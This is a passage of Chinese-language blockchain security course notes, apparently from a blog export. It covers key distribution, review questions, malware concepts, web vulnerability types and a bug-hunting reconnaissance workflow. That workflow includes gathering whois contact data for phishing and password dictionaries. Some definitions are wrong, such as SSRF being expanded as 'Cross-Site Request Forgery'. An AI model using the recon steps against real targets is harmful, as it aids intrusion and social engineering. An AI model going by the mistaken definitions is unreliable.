方的通信。\n\n具有保密和认证功能的密钥分配:\n针对简单分配密钥的缺点，人们又设计了具有保密和认证功能的非对称密码技术的密钥分配，如下图所示。\n\n密钥分配过程既具有保密性，又具有认证性，因此既可以防止被动攻击，也可以防止主动攻击。\n\n\n题：1.请分析网络信息安全非常重要的原因。\n2.请说明网络信息安全的内涵、特征及网络信息安全问题的原因。\n3.请说明网络信息安全的目标和功能是什么。\n4.请说明信息安全技术需求和安全策略。\n5.请说明信息安全与区块链安全的区别和联系。\n6.请说明近几年国内出台了哪些网络相关法律，这些法律的出台有什么重要意义。\n\n比较对称密码算法和非对称密码算法的优缺点，考虑在异地的两个人如何通过不可信的网络信道传输信息？\n\n两个交易者A和B，假设B没有A的电话或邮箱的前提下，B如何相信A在网上发布的公钥就是真真的A发布的公钥，而不是C假冒A发布的？\n\n请说明密码学在信息安全领域有哪些作用。\n\n请说明密码系统的组成及它们之间的关系。\n\n请说明如何认识密码系统的安全性。\n\n请说明密码分析者对密码技术的攻击方式有哪些，并简要说明？\n\n给定DES算法，在平均意义下，有多少个密钥可以把一个指定的输入分组加密得到一个指定的输出分组？\n\n什么是非对称加密？和对称加密的区别？它的工作原理是什么？\n\n利用 ab mod n&#x3D;((a mod n)(b mod n)) mod n,能把35^77 mod83所需的76次乘法运算化简到11次吗，还可以进一步化简吗。\n\n选择两个素数p &#x3D; 7和 q &#x3D; 11。计算n 和 φ（n）；选择公钥指数e&#x3D;17。计算私钥指数d；加密明文消息m&#x3D;5，计算密文。\n\n为什么要引进密钥管理技术？\n\n密钥管理系统涉及到密钥管理的哪些方面？\n\n什么是密钥托管？\n\n简述分布式密钥分配方案的过程。\n\n简述集中式密钥分配方案的过程，并分析可能存在的潜在威胁。\n\n\n","url":"2024/10/30/链安1/","date":"2024-10-30"},{"title":"区块链安全基础三","content":"七.恶意代码及防范技术与漏洞挖掘技术7.1 恶意代码的概念7.1.1常见名词举例计算机病毒：\n是一种计算机程序代码，它递归地复制自己或其演化体。病毒感染宿主文件或者某个系统区域，或者仅仅是修改这些对象的引用，来获得控制权并不断地繁殖来产生新的病毒体\n蠕虫病毒：\n 主要在网络上进行复制\n逻辑炸弹：\n 通常是合法的应用程序，在编程时写入一些“恶意功能”\n特洛伊木马：\n 隐藏在一个合法的躯壳下的恶意代码\n漏洞利用：\n 漏洞利用代码（exploit code）针对某一特定  漏洞或一组漏洞\n下载器：\n 通过破坏杀毒软件，然后再从指定的地址下载大量其他病毒、木马进入用户电脑\n玩笑程序\n7.1.2恶意代码的危害\n破坏数据\n占用磁盘存储空间\n抢占系统资源\n影响计算机运行速度\n\n7.1.3恶意代码的命名规则1&lt;病毒前缀&gt;.&lt;病毒名&gt;.&lt;病毒后缀&gt; \n\n\n病毒前缀是指一个病毒的种类\n\n\n病毒名是指一个病毒的家族特征，是用来区别和标识病毒家族的\n\n\n病毒后缀是指一个病毒的变种特征，是用来区别具体某个家族病毒的某个变种的\n\n7.2 恶意代码的生存原理7.2.1恶意代码的生命周期•设计期：用编程语言制造一个恶意代码\n•传播期：通过不同的途径散布和侵入受害系统中\n•感染期：找到自己依附或隐藏的宿主，并实施依附或隐藏\n•触发期：满足触发条件时，恶意代码进入运行期\n•运行期：恶意代码的恶意目的得以展现\n•消亡期：恶意代码被检测出来，并应用相应的手段进行处理\n7.2.2恶意代码的传播机制\n恶意代码传播主要是通过复制文件、传送文件、运行程序等方式进行。\n\n主要传播机制：\n\n\n​\t\t 互联网\n​\t\t 局域网\n​\t\t 移动存储设备\n​\t\t 无线设备和点对点通信系统\n7.2.3恶意代码的感染机制感染执行文件\n 主要感染.exe 和 .dll 等可执行文件和动态连接库文件\n 根据恶意代码感染文件的方式不同，可以分为外壳型恶意代码、嵌入型恶意代码、源代码型恶意代码、覆盖型恶意代码和填充型恶意代码等\n感染引导区\n 如果恶意代码感染了引导区，开机后，它被读入内存时，杀毒软件还没有读入内存，恶意代码就获得了系统控制权，改写操作系统文件，隐藏自己\n感染结构化文档\n 宏病毒是一种寄存在文档或模板的宏中的恶意代码。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。从此以后，所有自动保存的文档都会“感染”上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上\n7.2.4恶意代码的触发机制\n恶意代码在传染和发作之前，往往要判断某些特定条件是否满足，满足则传染或发作，否则不传染或不发作或只传染不发作\n\n日期触发\n\n时间触发\n\n键盘触发\n\n感染触发\n\n启动触发\n\n访问磁盘次数触发\n\n调用中断功能触发\n\nCPU型号&#x2F;主板型号触发\n被恶意代码使用的触发条件是多种多样的，而且往往不只是使用上面所述的某一个条件，而是使用由多个条件组合起来的触发条件\n\n\n7.3 恶意代码的分析与检测技术7.3.1恶意代码的分析方法静态分析法:\n 在不执行恶意代码的情况下进行分析。\n 可以分为源代码分析、反汇编分析、二进制统计分析三种情况\n动态分析法:\n 通过检测恶意代码执行的过程，分析执行过程中的操作。\n在实际应用中，一般将恶意代码分析方法分成三类：\n基于代码特征的分析方法\n\n首先，获取一个病毒程序的长度，根据长度可以将文件分为几份\n然后，每份中选取通常为16或32个字节长的特征串\n最后，将选取出来的几段特征码及它们的偏移量存入病毒库，标示出病毒的名称\n\n\n基于代码语义的分析方法\n\n通过各种渠道收集到最新的未知恶意代码样本时，进行文件格式分析\n对样本文件的属性进行查看分析\n对样本的行为进行分析，分析它的本地感染行为，以及网络传播行为\n通过静态反汇编工具（IDA等）对的恶意代码程序的PE文件进行反汇编\n通过动态调试对恶意代码加载调试，进一步分析代码的操作\n\n\n基于代码行为的分析方法\n\n基于以下理论展开：软件行为&#x3D; API + 参数\n\nabout软件行为：\n六大类常见软件恶意行为\n\n修改注册表启动项\n修改关键文件\n控制进程\n访问网络资源\n修改系统服务\n控制窗口\n\n7.3.2 恶意代码的检测方法\n基于特征码的检测法\n\n启发式检测法\n\n\n​\t（通过对某种恶意代码调用内核函数的名称和次数进行分析，建立恶意代码内核函数调用集合，比较待查程序调用的内核函数和数据库中已知恶意代码的内核函数调用集合的贴近度）\n\n基于行为的检测法\n\n完整性验证法\n\n基于特征函数的检测方法（发现调用危险的特殊函数）\n\n\n7.4 恶意代码的清除与预防技术7.4.1恶意代码的清除技术\n选择适当的封锁策略\n\n​\t\t 鉴别和隔离被感染主机\n​\t\t 阻塞发送出的访问\n​\t\t 关闭邮件服务器\n​\t\t 断开局域网与因特网的连接\n\n感染来源线索的收集和处理\n\n杀除与恢复\n\n\n7.4.2恶意代码的预防技术\n使用反病毒软件\n阻塞可疑文件\n限制使用不必要的具有传输能力的文件\n安全处理邮件附件\n避免开放网络共享\n使用Web浏览器的安全机制限制移动代码\n设置邮件客户端\n\n7.5 漏洞的基本概念漏洞（ Vulnerability），是指计算机系统安全方面的缺陷，使得系统或其应用数据的保密性、完整性、可用性、访问控制等面临威胁。\n许多安全漏洞是程序错误导致的，此时可叫做安全缺陷（Security bug），但并不是所有的安全隐患都是程序安全缺陷导致的。\nPOC （Proof of concept）是对某些想法的一个较短而不完整的实现，以证明其可行性，示范其原理，其目的是为了验证一些概念或理论。概念验证通常被认为是一个有里程碑意义的实现的原型 。\n在计算机安全术语中，概念验证经常被用来作为0day、exploit的别名。（通常指并没有充分利用这个漏洞的exploit）\n漏洞利用 （Exploit，简称为EXP）是计算机安全术语，指的是利用程序中的某些漏洞，来得到计算机的控制权（使自己编写的代码越过具有漏洞的程序的限制，从而获得运行权限）。在英语中，表示为了利用漏洞而编写的攻击程序，即漏洞利用程序。\n零日漏洞 （zero-day vulnerability、0-day vulnerability）通常是指还没有补丁的安全漏洞，而零日攻击（zero-day exploit、zero-day attack）则是指利用这种漏洞进行的攻击。提供该漏洞细节或者利用程序的人通常是该漏洞的发现者。\n7.6 漏洞挖掘技术的定义及分类漏洞挖掘 是指查找目标系统中可能存在的漏洞，在这个过程中，需要运用多种计算机技术和工具。   \n根据挖掘对象的不同，漏洞挖掘一般可以分为两大类，即基于源代码的漏洞挖掘和基于目标代码的漏洞挖掘。\n   对于基于源代码的漏洞挖掘来说，首先要获取系统或软件的源代码程序，采取静态分析或动态调试的方式查找其中可能存在的安全隐患。但大多数商业软件的源代码很难获得，一般只有一些开源系统能为挖掘者提供源码，如LINUX系统，所以目前基于源代码的挖掘一般都是LINUX系统及其开源软件。对于不能提供源码的系统或软件而言，只能采用基于目标代码的漏洞挖掘方法，该方法一般涉及程序编译器、计算机硬件指令系统、可执行文件格式等方面的分析技术，实现难度较大。\nWEB漏洞 ：通常是指网站程序上的漏洞，可能是由于代码编写者在编写代码时考虑不周全等原因而造成的漏洞，常见的WEB漏洞有Sql注入、Xss漏洞、上传漏洞等。\nXSS (Cross-Site Scripting)，跨站脚本，因为缩写和 CSS重叠，所以只能叫 XSS。跨站脚本是指通过存在安全漏洞的Web网站，在用户的浏览器内运行非法的HTML或JavaScript进行的一种攻击。\nSQL注入 就是指Web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数代入数据库查询，攻击者可以通过在不同的SQL语句来实现对数据库的任意操作。\nCSRF（Cross-Site Request Forgery）中文意思为跨站请求伪造，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。CSRF通过伪装成受信任用户请求受信任的网站。CSRF难以防范，危险性比XSS更高。\nSSRF（Cross-Site Request Forgery）中文为服务器端请求伪造，是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统。\n文件上传漏洞 是在上传文件时，如果服务器代码未对客户端上传的文件进行严格的验证和过滤，很容易造成可以上传任意文件的情况，包括上传脚本文件（asp、aspx、php、jsp等格式的文件）。非法用户可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被成为WebShell，也可将WebShell脚本称为一种网页后门，WebShell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。\n命令执行 应用程序有时需要调用一些执行系统命令的函数，如在PHP中，使用system、exec、shell_exec、passthru、popen、proc_popen等函数可以执行系统命令。当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。\n逻辑漏洞 就是指攻击者利用业务的设计缺陷，获取敏感信息或破坏业务的完整性。一般出现在密码修改、越权访问、密码找回、交易支付金额等功能处。其中越权访问又分为水平越权和垂直越权。\n7.7 漏洞挖掘技术的一般流程阅读规则确定测试范围\n信息搜集-子域名收集\n工具：DNS枚举：一台服务器、一个工具\n​\t\t\tDNSenum是一款非常强大的域名信息收集工具。它能够通过谷歌或者字典文件猜测可能存在的域名，并对一个网段进行反向查询。它不仅可以查询网站的主机地址信息、域名服务器、邮件交换记录，还可以在域名服务器上执行axfr请求，然后通过谷歌脚本得到扩展域名信息，提取出域名并查询，最后计算C类地址并执行whois查询，执行反向查询，把地址段写入文件。\n在Kali Linux安全渗透教程新手版中讲解过该工具的基本使用。这里讲解一下该工具的字典破解子域名功能。\n首先使用-f选项指定一个常见子域名字典文件；然后使用-u选项，设置字典文件更新方式。当设置a，则将本次执行过程中，从其他图形获取的子域名添加到该文件中。这样，就相当于维护了字典文件。\n​\t\t\t\t坑： 1.泛解析 2.不够全面 \n子域名收集–泛解析问题\n信息搜集-C段资产收集\n信息搜集–移动端资产收集\n信息搜集–同备案号资产收集\n7.8 漏洞挖掘技术的常用方法和工具黑盒测试指把被测试目标看做一个黑盒子，对于内部结构、运作情况是不可见的。模拟黑客的攻击行为，找出目标点存在的漏洞\n  在黑盒漏洞挖掘中，必须要做的事就是对目标资产的收集，收集的资产越多，越容易挖出漏洞\n白盒审计是已知源代码，根据源代码审计漏洞\n审计方法简介\n1.定位敏感关键字，回溯参数传递过程\n2.定位敏感功能点，通读功能点代码(系统重装、文件上传、文件功能管理、登录认证、密码找回、订单支付)\n3.通读全文\n方法1 优势在于能快速审计，代码量小，容易找到漏洞点，但是也容易忽略很多漏洞，如逻辑漏洞无法这样审计得到\n方法2 优势在于代码量比通读全文小，能审计出逻辑漏洞\n方法3 不会出现忽略漏洞的情况，但是代码量大，耗费时间长\n信息收集（列出信息收集需要收集的点）\n1.查询网站whois信息，从whois和网站中获取注册者的电话、姓名、邮箱等信息方便后期社工钓鱼生成专属密码字典等 2.shadon、fofa等网络资产搜索引擎，天眼查网站的相关产权获得一些资产、github敏感信息泄露、各种网盘搜索引擎、微信公众号、服务号、小程序、app等 3.查看网站旁站和子域名(主站一般防护都挺严)，网站都查询一下网站指纹是否存在通用CMS漏洞 4.查看服务器操作系统版本，Web中间件，网站语言等等，看看有没有可以利用的Web中间件漏洞 5.网站目录扫描，看看有没有敏感信息和接口泄露，如网站管理后台、网站源码备份、git泄露、phpinfo等 6.用JSFinder从网站JS里面提取信息，看有没有敏感接口和链接，顺便在收集一下子域名看有没有之前漏掉的 7.使用全球ping查看网站是否存在cdn（CDN是指内容分发网络） 8.端口扫描，查看有无可利用端口，如ftp、ssh的弱口令，rsync、Redis、docker等的未授权访问等\n（rsync是linux系统下的数据镜像备份工具）\n关于扫描whois\n它能查询到域名注册者的信息\nDirbuster&amp;御剑\n这两款工具都是网站目录扫描工具，可以扫描敏感信息及接口\nGoogle hacking\n可以用来指定搜索语法搜索自己想要的内容，如网站后台搜索，子域名搜集，具体事物的信息收集\nwhatweb\n可以用来获取目标网站web容器，操作系统，ip地址，是否有某cms指纹等等信息\nJSFinder\n可以用来从网站js里面提取敏感接口和子域名\nnmap\n可以用来进行端口扫描以及探测存活主机\nawvs\n用来进行漏洞扫描\nxray\n可以直接用来进行漏洞扫描\n关于审计phpstorm\n既然要审计代码，那么要有一款好的ide，如phpstrom、vscode等，结合Xdebug方便跟踪调试代码\nrips\nrips能够自动审计，给出一些可能存在漏洞的地方以及漏洞类型，然后人为去验证判断，能减少很多审计时间\nSeay源代码审计系统\n类似于rips也是一款自动审计工具\n八.隐私威胁与保护隐私保护技术隐私保护技术是指一系列用于保护用户隐私信息安全的技术手段，主要包括加密技术、身份识别技术、数据去标识化技术等。隐私保护技术的发展在一定程度上可以保护个人隐私信息免受不法侵害，起到保障用户权益和数据安全的作用。\n具体来说，隐私保护技术发展的作用包括：\n   数据加密保护：通过加密技术，对数据进行加密后再传输，可以有效防止数据在传输过程中被窃取或篡改。\n   匿名化处理：通过数据去标识化技术，将用户的个人信息和身份与特定的行为或数据解耦，从而保护用户的个人隐私。\n   身份验证技术：使用生物特征识别、二次验证等技术确保用户的身份安全，防止非法用户冒充他人身份。\n   隐私政策和控制：通过隐私政策和隐私控制工具，用户可以了解数据收集和使用情况，并自主选择是否分享个人信息。\n   安全存储和访问控制：通过访问控制和安全存储技术，确保个人敏感信息只能被授权人员访问，避免数据泄露。\n隐私保护技术涉及的密码技术内容主要包括同态加密、环签名技术、安全多方计算和零知识证明等。\n密码知识\n在区块链中应用\n\n​    同态加密首先运用在云计算和大数据中。对于区块链技术，同态加密也是很好的互补。使用同态加密技术，运行在区块链上的智能合约可以处理密文，而无法获知真实数据，极大地提高了隐私安全性。\n​    对于区块链网络用户来说，希望提交到区块链网络中的数据安全性能得以保证，尤其是重要敏感数据的安全性，应避免恶意的信息泄露和篡改。同态加密技术能够使用户的密文数据在区块链智能合约中密文运算，而非传统的明文运算。这样的优点是，用户将交易数据提交到区块链网络之前，可使用相应的加密算法对交易数据进行加密，数据以密文的形式存在，即使被攻击者获取，也不会泄露用户的任何隐私信息，同时密文运算结果与明文运算结果一致。\n\n同态加密在区块链中的具有如下应用：数据隐私保护：在区块链中，大量的交易和数据需要被记录和验证，而同态加密技术可以确保这些数据在被存储和共享时保持加密状态，仅有授权用户才能访问和运算。\n智能合约安全性：智能合约是区块链中一种自动执行合约的机制，同态加密可以用于保护智能合约中的敏感数据，确保合约的安全性和隐私性。\n隐私保护的数据共享：区块链上的数据共享有时需要保护数据的隐私性，而同态加密可以使多方在密文状态下共享和处理数据，以保护数据隐私。\n安全数据分析：利用同态加密技术，区块链可以实现对加密数据集合进行计算分析，避免泄露隐私信息的同时仍然可以获得有用的数据分析结果。\n\n\n零知识证明指的是证明者能够在不向验证者提供任何有用的信息的情况下，使验证者相信某个论断是正确的。零知识证明实质上是一种涉及两方或更多方的协议，即两方或更多方完成一项任务所需采取的一系列步骤。证明者向验证者证明并使其相信自己知道或拥有某一消息，但证明过程不能向验证者泄漏任何关于被证明消息的信息。\n零知识证明：零知识，即在证明的过程中不透露任何内情。通俗的来讲，就是既证明了自己想证明的事情，同时透露给验证者的信息为“零”。\n证明举例\n  （1）用户在系统注册时，系统不会保存用户的密码明文，而是保存了密码的哈希值；用户在登录系统时，只需要输入注册时的密码，系统会根据用户输入密码产生的哈希值与系统数据库保存的哈希值进行比对。如果一致，则系统认为——当前登录用户知道该账号的密码。\n这样，用户不需要告诉网站密码，就能证明自己的身份。这其实就是一种零知识证明。\n  （2）B确定该房间内有某一物体，A用自己拥有的钥匙打开该房间的门，然后把物体拿出来出示给B，从而证明自己确实拥有该房间的钥匙。在整个证明的过程中，B始终不能看到钥匙的样子，从而避免了钥匙的泄露。\n  （3）A要去公司实习，公司要求A在校所有功课没有挂科，才有资格加入公司。A虽然所有功课都没有挂科，但都在61、62左右徘徊；A不想让公司看到自己的成绩单，于是A委托学校开了一个证明：证明A在校所有功课全部及格。并交到了公司，加入了公司。\n这样，A既没暴露自己的确切考试成绩，又向公司证明自己满足要求。这其实就是零知识证明。\n4）A拥有B的公钥，A没有见过B，而B见过A的照片，偶然一天2人见面了，B认出了A，但A不能确定面前的人是否是B，这时B要向A证明自己是B，也有2个方法。\n   ①B把自己的私钥给A，A用这个私钥对某个数据加密，然后用B的公钥解密，如果正确，则证明对方确实是B。\n   ②A给出一个随机值，并使用B的公钥对其加密，然后将加密后的数据交给B，B用自己的私钥解密并展示给A，如果与A给出的随机值相同，则证明对方是B。\n第二种方法属于零知识证明。\n零知识证明的特点：\n （1）隐私保护：零知识证明允许在不泄露敏感信息的前提下向他人证明某个主张的真实性，从而保护了个人的隐私和数据安全。\n （2）不可伪造性：零知识证明要求证明者以一种无法被伪造的方式向验证者证明某个主张的真实性，确保了证明的可靠性和完整性。\n （3）交互式验证：零知识证明通常需要证明者和验证者之间进行多轮的交互式通讯和计算，以确认证明的有效性。\n应用场景：\n（1）身份验证：用户可以使用零知识证明向服务提供者证明自己拥有正确的身份信息，而无需透露具体的个人信息。这有助于保护用户的隐私并防止身份盗窃。\n（2）支付系统：在电子支付系统中，用户可以使用零知识证明向商家证明自己有足够的资金进行支付，而无需透露具体的账户余额或其他财务信息。这有助于保护用户的财务隐私并提高支付系统的安全性。\n（3）知识产权保护：企业可以使用零知识证明来保护自己的知识产权，例如专利、商标或版权。他们可以证明自己拥有某个专利或商标的权利，而无需公开具体的专利内容或商标细节。\n（4）区块链应用：零知识证明在区块链技术中也有着广泛的应用。例如，在加密货币交易中，用户可以使用零知识证明来证明自己拥有足够的加密货币进行交易，而无需透露具体的交易历史或地址余额等信息。这有助于提高交易的隐私性和安全性。\n应用实例：\n目前ZCASH（大零币）使用零知识机制来证明交易有效，在ZCASH中，摒弃了之前的UTXO方式，而是使用了一种基于UTXO，被称为NOTE（支票）的新方式代替。NOTE代表了当前账户对资产的支配权，与UTXO不同，账户余额的存储方式不再是“未消费的交易输出”，而是“未被作废的支票（NOTE）”；一个NOTE是由所有者公钥PK、所拥有金额V、和唯一区分支票的序列号r组成，表示为NOTE&#x3D;(PK， v， r)\n   ZCash交易分为两类：透明地址交易和隐藏地址交易。透明地址交易的输入、输出直接是可见的NOTE信息；隐藏地址交易，输入和&#x2F;或输出的地址和金额是隐藏的。\n   在ZCASH的隐藏地址交易中，交易的输入输出不再是明文的NOTE，而是NOTE的签发和废弃通知。如下图：\n\n 左侧代表的是“签发的新的NOTE”，右侧代表的是“作废的NOTE”。每次进行转账，就会把转账方的NOTE放到作废列表里，代表此NOTE已经作废，同时为收款方创建一张等额的NOTE。这样就实现了“资产的转移”，并且由于都是记录的NOTE的哈希值，因此并不知道被废弃的和新签发的NOTE的内容，这样就做到了隐藏交易双方及交易细节。\n   矿工如何确认这些匿名交易？\n在矿工确认交易时，转账方会提供一个证明P，能够证明：转账方通过金额V、公钥PK、支票序列号r计算后的哈希值，与在签发列表中存在的哈希值一致，这足以证明转账方的NOTE存在。这样既没有泄露转账方的信息，又证明了NOTE存在。\n   矿工确认NOTE存在后，就会在作废列表中查询，如果没有此笔NOTE的作废记录，则证明转账方NOTE有效（防止双花）。然后再在作废列表中，把当前NOTE的序列号哈希计算后的值记录在作废列表中，表明此笔NOTE已经作废，同时为收款方签发新的NOTE。\n   至此，就可以在区块链中应用零知识证明来保护交易双方隐私了。\n环签名技术环签名解决的问题是，我对你说了一句话，但是你只知道是某一群人中有人对你说了这句话，而不知道这群人里具体哪个人说的。简言之就是，我把自己藏进了人群里。环签名通过将实际签名者的公钥藏进一个公钥集合，来达到保护签名者身份的目的。\n环签名具有保护签名者隐私和身份匿名的特性，适用于需要保护参与者身份和行为隐私的场景。通过环签名技术，签名者能够在不暴露自己身份的情况下签署消息，确保数据的安全性和隐私性。\n环签名也被称为 CryptoNote，由群签名演化而来，典型的应用案例是门罗币。群签名是利用公开的群公钥和群签名进行验证的方案，其中群公钥是公开的，群成员可以生成群签名，验证者能利用群公钥验证所得群签名的正确性，但不能确定群中的正式签名者。可是群管理员可以撤销签名，揭露真正的签名者群签名，这是群签名的关键问题所在。\n   环签名方案则去掉了群组管理员，不需要环成员之间的合作，签名者利用自己的私钥和集合中其他成员的公钥就能独立的进行签名，集合中的其他成员可能不知道自己被包含在了其中。这种方案的优势除了能够对签名者进行无条件的匿名外，环中的其他成员也不能伪造真实签名者签名。外部攻击者即使在获得某个有效环签名的基础上，也不能伪造一个签名。\n\n匿名性保护。环签名可以防止交易链上的身份追踪：在使用环签名进行交易签名时，签名者的身份被隐藏在一个成员固定大小的环中，无法被外部观察者追踪。因此，交易链上的身份追踪变得更加困难，保护了用户的交易隐私和身份隐私。并且签名者可以在一个匿名的环中签署交易，使得用户在区块链上的交易活动不会暴露其真实身份，提高了用户交易的匿名性。\n\n数据隐私保护。环签名可以保护交易内容的机密性：环签名技术不仅可以保护用户的身份隐私，还能保护交易内容的机密性。即使区块链上的所有交易信息都是公开的，但通过环签名，交易内容仍然可以保持加密私密状态，不易被外部方获取。\n\n抗审查性保护。环签名可以防止审核和审查：通过环签名技术，区块链中的交易可以在签署者身份的保护下完成，无法被审查者追踪。这使得黑客、监视者和第三方无法通过分析区块链中的信息来获取用户的隐私信息。\n\n信任建立。环签名可以建立信任：通过提高用户的身份和数据隐私保护水平，环签名技术有助于建立用户和社区之间的信任关系。用户可以更加放心地在区块链上进行交易和参与各种智能合约活动\n\n\n隐私威胁与保护数据泄露是指系统信息被未经授权的人或组织获取，这可能导致各种威胁问题。数据泄露引起隐私威胁的主要原因：\n   网络安全漏洞：许多网站和应用程序可能存在安全漏洞，这些漏洞可能被黑客利用来窃取用户数据。\n   人为错误：个人或组织在处理敏感信息时可能会犯错。\n   恶意软件：病毒、间谍软件等恶意软件可以窃取系统的敏感数据。\n   社交工程攻击：黑客通过欺骗手段诱使个人泄露自己的敏感信息，例如通过假冒的电子邮件或电话请求密码重置。\n   不安全的网络连接：在公共Wi-Fi网络上进行敏感操作可能会导致数据被截获。\n区块链面临的一些隐私威胁：\n   交易信息隐私泄露：区块链上的交易信息，如发送者、接收者和交易金额，可能会被泄露。为了保护这些信息，可以采用混币、环签名和机密交易等技术。\n   智能合约隐私漏洞：智能合约可能存在漏洞，如果被黑客利用，可能会导致系统崩溃或交易数据泄露。为了防范这一风险，可以采用零知识证明、多方安全计算、同态加密等技术来保护合约数据。\n   链上数据隐私泄露：区块链上的交易数据虽然与用户身份信息分离，但仍有可能通过分析交易模式来追踪用户的身份。为了进一步保护隐私，可以采用账本隔离、私有数据和数据加密授权访问等解决方案。\n以下从用户身份隐私、交易隐私、网络隐私、通信隐私几个方面分析区块链技术隐私泄露问题\n用户身份隐私​\t用户身份隐私主要是指交易双方的地址信息，其本质是双方公钥的哈希值。在早期时候，因为这种地址的匿名特性，交易的所有数据都是公开的。但随着技术的发展，可以通过拓扑学、社会学、统计学以及溯源技术等一系列知识，分析得到交易双方在现实世界的真实信息，用户的隐私信息更会受到极大的威胁。\n   最常用的解决方案主要是混币机制，也就是将多笔交易混合在一起，切断加密货币中交易方与接收方的联系，提高加密货币的隐私性和匿名性。\n混币过程的执行可以由可信第三方或者是某种协议执行，根据这种特性，混币机制也可分为基于中心化结点的混币机制和去中心化的混币机制。\n   基于中心化的混币机制：其本质是单纯地将一笔资金在多个地址中多次转移，实现简单、易于操作，在现有的各类数字货币系统中具有极高的适用性。但中心化混币机制普遍存在额外收费和时延问题，第三方节点的可信度也得不到保证，以此也容易引发第三方盗窃资金、泄露混币过程的风险。盲签名技术虽然可以降低混币过程泄露的风险，但又会引起混币计算代价增高。\n   去中心化的混币机制：整个过程由混币协议实现，不需要第三方节点的参与，能有效避免中心化混币机制出现的问题，可去中心化混币机制的计算成本要更高，服务效率也更加较为低下。而且这一种机制仍然不能说是绝对安全，比如无法保证所有参与混币的用户守信、混币用户信息易泄露、容易遭受拒绝服务攻击等等。门罗币（Monero）在混币机制中采用了环签名加密技术，虽然有效避免了上述风险，但混币过程却变得更加冗长。\n智能合约漏洞也会导致用户隐私泄露。如果用户的敏感信息被不当地存储在智能合约中，一旦合约被攻击或者泄露，这些信息可能会暴露用户的身份和其他隐私数据；智能合约中的交易逻辑可能涉及用户的身份信息或其他敏感数据，一旦有人分析了智能合约的交易逻辑，就有可能通过相关信息识别用户。\n   不当的方法会导致用户隐私泄露。如区块链上的数据共享特性可能导致用户的敏感数据被不当地分享给其他参与者，从而暴露用户的身份和隐私信息。如果用户在区块链上存储了未经加密的敏感信息，就容易被他人获取和解密，暴露用户的身份隐私。如果区块链平台缺乏明确的隐私保护协议，用户无法有效地保护自己的身份隐私。\n为了解决上述隐私泄露问题，可采取以下措施：\n （1）加密数据：在数据上链之前对敏感信息进行加密处理，确保只有授权方才能解密数据。\n （2）匿名化处理：使用匿名地址进行交易，避免地址与用户身份关联。\n （3）隐私保护协议：建立隐私保护协议，明确区块链上数据的使用和共享规则，保护用户隐私权益。\n （4）技术改进：研发更安全的智能合约代码，及时修补漏洞，提高系统的安全性和隐私保护能力。\n用户交易隐私​    在区块链数字货币起步较早的时候，数字货币仅仅是以数据链的方式从一个钱包直接转移到另一个钱包，其交易记录不做任何保护措施全部公开在区块链系统中。这样虽然有效防止了双重花费问题，但在隐私保护方面却有着极大的问题。然后又有人提出将交易数据的哈希值上链，数据本体仍然储存在链下的中心数据库。可这样一来区块链技术的防篡改、分布式特性就没有得到发挥，特别是线下数据库一旦发生存储丢失、数据损坏、单机故障等问题后还会导致系统的验证能力失效，从而引发一系列问题。    \n后来又有人提出将交易数据链下加密后再上链，也就是通过对称方式加密数据，非对称加密方式加密对称密钥的方式。可这样的加密方式仍然存在一定缺陷，首先是加密过后的数据无法通过合约来进行数据的操作以及共享。然后就是加密密钥传递需要中心化机构的参与，双方的私密数据不透明，也无法通过区块链的共识来进行验证。  \n​    还有一种方案是将交易数据直接进行非对称加密上链，但这种方案在很多时候也是不可行的，因为非对称加密算法主要适用于数据量较小时短数据的加密，对于交易数据这种长数据只有对称加密的性能才可以达到。但对称密钥加密数据又会存在密钥的协商问题。基于以上的问题，有人又提出了基于双重加密的交易隐私保护方法，在保证隐私数据安全性的同时，优化了加密方案，使性能得到了很好的提升。\n举例：\n假设用户 Alice 需要向 Bob 转账 1 个 ZEC，基于零知识证明操作过程：\n（1）用户 Alice 会先将自己的这 1 个 ZEC 拆分成若干份，具体份数可以根据设置来定。\n（2）大零币的公有链同时也会将其他交易输出与 Alice 的若干份 ZEC 进行混合拆分，最后从中取出合计为 1 个 ZEC 的若干份发送给 Bob 的收款地址。经过这条公有链一系列的“混币”过程，就使得包括交易地址和具体金额在内的交易信息具有很强的隐匿性。另外，从上述过程来看要实现匿名性，其所花费的计算资源就非常多，带来了大量的资源浪费，也导致了其可扩展性面临巨大挑战。\n除此之外还有同态加密、零知识证明、数据隔离、属性加密等解决方案。\n网络隐私​    网络隐私主要分为节点隐私以及通信隐私。节点隐私主要内容有服务器地理位置、节点的物理信息、系统版本、节点 IP 等。在区块链上每一个节点的安全防护能力都是不同的，再加上区块链是一个对等网络，攻击者想要获取链上被保护的数据比起中心化数据库还可能更简单一些。对公有链来说，任意节点都可以接入，攻击者也可以通过监听、扫描技术等对整个网络进行探测攻击。甚至有人通过这些方式获取了大量的比特币节点信息，然后绘制出整个比特币系统的网络拓扑，再与溯源技术结合，用户的数据隐私将受到严重威胁。\n通信隐私主要内容包括数据流量、节点间数据明文及密文等。虽然如今的加密货币很多都采用了ZK-SNARK 或者是环签名等先进密码学技术，但攻击者仍可以利用旁道攻击技术，破坏交易的不可连接性、机密性、不可追溯性、匿名性等。如今，对于这类隐私威胁，常采用的解决方案有可行第三方转发、混合网络、洋葱网络、大蒜路由、雷电网络、闪电网络等。\n​    洋葱网络：主要由洋葱路由组成，使攻击者获取全局信息的难度大大增加，极大地降低了通信隐私泄露威胁。特别是第二代洋葱路由的出现，进一步优化了洋葱网络，其实用性也变得更强。\n​    